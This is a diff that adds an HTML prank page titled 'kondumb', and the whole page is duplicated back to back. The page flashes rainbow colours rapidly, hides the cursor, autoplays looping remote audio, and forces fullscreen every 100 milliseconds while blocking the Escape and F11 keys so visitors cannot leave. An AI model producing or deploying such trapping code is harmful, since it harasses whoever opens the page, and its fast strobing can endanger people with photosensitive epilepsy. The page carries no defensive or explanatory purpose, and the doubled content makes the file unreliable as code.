@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>kondumb</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            text-transform: uppercase;
+            animation: bgFlash 0.5s infinite;
+            cursor: none;
+        }
+        
+        h1 {
+            font-size: 10vw;
+            text-align: center;
+            animation: textFlash 0.5s infinite;
+            text-shadow: 0 0 20px rgba(255,255,255,0.8);
+        }
+        
+        @keyframes textFlash {
+            0% { color: #ff0000; }
+            14% { color: #ff7f00; }
+            28% { color: #ffff00; }
+            42% { color: #00ff00; }
+            56% { color: #0000ff; }
+            70% { color: #4b0082; }
+            84% { color: #9400d3; }
+            100% { color: #ff0000; }
+        }
+        
+        @keyframes bgFlash {
+            0% { background-color: #0000ff; }
+            14% { background-color: #4b0082; }
+            28% { background-color: #9400d3; }
+            42% { background-color: #ff0000; }
+            56% { background-color: #ff7f00; }
+            70% { background-color: #ffff00; }
+            84% { background-color: #00ff00; }
+            100% { background-color: #0000ff; }
+        }
+    </style>
+</head>
+<body>
+    <h1>kondumb</h1>
+    
+    <audio autoplay loop>
+        <source src="https://files.catbox.moe/stfi3t.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        // Fullscreen spam function
+        function spamFullscreen() {
+            try {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            } catch (e) {}
+            
+            // Try to prevent exiting fullscreen
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F11' || e.key === 'Escape') {
+                    e.preventDefault();
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            });
+        }
+
+        // Start fullscreen spam
+        document.addEventListener('click', function() {
+            // Start audio
+            const audio = document.querySelector('audio');
+            audio.play().catch(e => console.log(e));
+            
+            // Start fullscreen spam
+            spamFullscreen();
+            
+            // Continuous fullscreen spam
+            setInterval(spamFullscreen, 100);
+        }, { once: true });
+
+        // Try to go fullscreen immediately
+        setTimeout(spamFullscreen, 50);
+        setInterval(spamFullscreen, 100);
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>kondumb</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            text-transform: uppercase;
+            animation: bgFlash 0.5s infinite;
+            cursor: none;
+        }
+        
+        h1 {
+            font-size: 10vw;
+            text-align: center;
+            animation: textFlash 0.5s infinite;
+            text-shadow: 0 0 20px rgba(255,255,255,0.8);
+        }
+        
+        @keyframes textFlash {
+            0% { color: #ff0000; }
+            14% { color: #ff7f00; }
+            28% { color: #ffff00; }
+            42% { color: #00ff00; }
+            56% { color: #0000ff; }
+            70% { color: #4b0082; }
+            84% { color: #9400d3; }
+            100% { color: #ff0000; }
+        }
+        
+        @keyframes bgFlash {
+            0% { background-color: #0000ff; }
+            14% { background-color: #4b0082; }
+            28% { background-color: #9400d3; }
+            42% { background-color: #ff0000; }
+            56% { background-color: #ff7f00; }
+            70% { background-color: #ffff00; }
+            84% { background-color: #00ff00; }
+            100% { background-color: #0000ff; }
+        }
+    </style>
+</head>
+<body>
+    <h1>kondumb</h1>
+    
+    <audio autoplay loop>
+        <source src="https://files.catbox.moe/stfi3t.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        // Fullscreen spam function
+        function spamFullscreen() {
+            try {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            } catch (e) {}
+            
+            // Try to prevent exiting fullscreen
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F11' || e.key === 'Escape') {
+                    e.preventDefault();
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            });
+        }
+
+        // Start fullscreen spam
+        document.addEventListener('click', function() {
+            // Start audio
+            const audio = document.querySelector('audio');
+            audio.play().catch(e => console.log(e));
+            
+            // Start fullscreen spam
+            spamFullscreen();
+            
+            // Continuous fullscreen spam
+            setInterval(spamFullscreen, 100);
+        }, { once: true });
+
+        // Try to go fullscreen immediately
+        setTimeout(spamFullscreen, 50);
+        setInterval(spamFullscreen, 100);
+    </script>
+</body>
+</html>
